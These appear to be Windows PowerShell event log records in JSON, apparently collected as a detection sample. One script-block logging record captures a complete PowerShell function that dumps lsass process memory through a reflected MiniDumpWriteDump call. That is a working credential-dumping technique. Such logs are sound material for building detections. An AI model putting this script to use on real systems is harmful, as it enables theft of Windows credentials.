{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"}},"EventID":40961,"Version":1,"Level":4,"Task":4,"Opcode":1,"Keywords":"0x0","TimeCreated":{"#attributes":{"SystemTime":"2020-06-30T14:23:58.394425Z"}},"EventRecordID":968,"Correlation":{"#attributes":{"ActivityID":"4AA5EAE3-4F33-0000-501D-A64A334FD601"}},"Execution":{"#attributes":{"ProcessID":7008,"ThreadID":5532}},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"MSEDGEWIN10","Security":{"#attributes":{"UserID":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}},"EventData":null}}
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"}},"EventID":53504,"Version":1,"Level":4,"Task":111,"Opcode":10,"Keywords":"0x0","TimeCreated":{"#attributes":{"SystemTime":"2020-06-30T14:23:58.440339Z"}},"EventRecordID":969,"Correlation":{"#attributes":{"ActivityID":"4AA5EAE3-4F33-0000-501D-A64A334FD601"}},"Execution":{"#attributes":{"ProcessID":7008,"ThreadID":1916}},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"MSEDGEWIN10","Security":{"#attributes":{"UserID":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}},"EventData":{"param1":"7008","param2":"DefaultAppDomain"}}}
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"}},"EventID":40962,"Version":1,"Level":4,"Task":4,"Opcode":2,"Keywords":"0x0","TimeCreated":{"#attributes":{"SystemTime":"2020-06-30T14:23:58.532115Z"}},"EventRecordID":970,"Correlation":{"#attributes":{"ActivityID":"4AA5EAE3-4F33-0000-501D-A64A334FD601"}},"Execution":{"#attributes":{"ProcessID":7008,"ThreadID":5532}},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"MSEDGEWIN10","Security":{"#attributes":{"UserID":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}},"EventData":null}}
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"}},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated":{"#attributes":{"SystemTime":"2020-06-30T14:24:08.254605Z"}},"EventRecordID":971,"Correlation":{"#attributes":{"ActivityID":"4AA5EAE3-4F33-0001-3A2B-A64A334FD601"}},"Execution":{"#attributes":{"ProcessID":7008,"ThreadID":6488}},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"MSEDGEWIN10","Security":{"#attributes":{"UserID":"S-1-5-21-3461203602-4096304019-2269080069-1000"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}","ScriptBlockId":"27f08bda-c330-419f-b83b-eb5c0f699930","Path":"C:\\Users\\Public\\lsass_wer_ps.ps1"}}}
